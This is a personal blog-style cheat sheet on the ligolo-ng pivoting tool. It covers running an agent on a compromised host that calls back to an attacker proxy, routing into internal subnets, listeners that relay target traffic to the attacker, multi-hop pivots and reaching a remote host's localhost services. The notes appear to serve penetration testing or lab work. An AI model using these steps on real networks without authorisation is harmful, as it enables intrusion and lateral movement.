---
layout: post
author: reo
title: 'ligolo-ng'
category: tools
tags: networking
---

https://github.com/nicocha30/ligolo-ng/wiki/Quickstart
Runs on port 11601 by default

## Quickstart
1. Upload `agent` to the remote host, don't run it yet
2. Start the proxy on the attacker machine
   ```bash
   sudo ./proxy -selfcert
   ```
3. Create the interface(s) in the ligolo-ng CLI for each agent as needed
   ```bash
   » interface_create --name ligolo
   ```
4. Start the agent on the remote host (and background process)
   Linux (POSIX):
   ```bash
   ./agent -connect ENTER_LISTENING_IP_HERE:11601 -ignore-cert &
   ```
   Windows (Powershell):
   ```Powershell
   Start-Job { .\agent.exe -connect ENTER_LISTENING_IP_HERE:11601 -ignore-cert }
   ```
5. Wait for the ligolo-ng proxy to detect that the agent has connected
6. In the Ligolo-ng CLI, run `session` and select the desired agent
7. Start the tunnel on the interface created in step 3
   ```bash
   » tunnel_start --tun ligolo
   ```
8. Find and confirm the subnet you wanna forward running `ifconfig` in the ligolo-ng CLI
9. Set up the route from step 8 in the ligolo_ng CLI
   ```bash
   » interface_add_route --name ligolo --route 172.16.1.0/24
   ```

**NOTE: [[Network Enumeration]] nmap scans need to run with `--unprivileged`**

## Listeners
On the ligolo-ng CLI
```bash
» listener_add --addr 0.0.0.0:41337 --to 0.0.0.0:41337
» listener_list
```
**Make sure the correct session is selected**
* Forwards connections made to the agent on port `--addr` to the attacker machine on port `--to`
* Consider this situation with the listener set up:
	* Attacker is running an HTTP server on 172.16.1.0/24 port 41337
	* Target is only on the 172.16.2.0/24 network
	* Agent is dual-homed with 172.16.1.0/24 and 172.16.2.0/24
	* Agent has IP 172.16.2.10 on the 172.16.2.0/24 network
	  - - -
	* Target runs `curl 172.16.2.10:41337/my_file`
	* The listener is set up so this is forwarded to the attacker
	* Target is able to get the file from the attacker

## Multi-Pivoting
Using the same names and IP addresses as the example in [[#Listeners]]
1. Set up a listener on Agent for the port ligolo-ng proxy uses (11601)
   ```bash
» listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
2. Run the agent on Target with the IP `172.16.2.10` and port from step 1
3. The proxy on the attacker machine receives the agent connection
4. Change session to the new connection on the ligolo-ng CLI
```bash
» session
```
5. Create the new interface and set up routes/tunnels on the ligolo-ng CLI
```bash
» interface_create --name ligolo2
» start --tun ligolo2
» interface_add_route --name ligolo2 --route 172.16.2.0/24
```

Can now reach the `172.16.2.0/24` network via the Target machine

## Port Forward for Localhost
**Make sure the correct session is selected**
```
[Agent : user@host2] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
NOTE this is on host2, there's a service on localhost:4444 that I want to access
```
[Agent : user@host2] » interface_create --name ligolo2
```
Create a new tun interface for the second pivot
```
[Agent : user@host2] » start --tun ligolo2
[Agent : user@host2] » interface_add_route --name ligolo2 --route 240.0.0.1/32
```
240.0.0.1 is an alias for localhost on the remote machine
Can now interact with services running on localhost on the remote machine by interacting with 240.0.0.1
Eg. `nc -nv 240.0.0.1 4444`

### Cleanup
Can delete interfaces using the ligolo-ng CLI:
```bash
ifdel --name ligolo # Delete the interface "ligolo"
```

## Troubleshooting
```bash
ip a                       # Interface info
ip route                   # Routes info
ip route del 172.16.1.0/24 # Delete routes
```

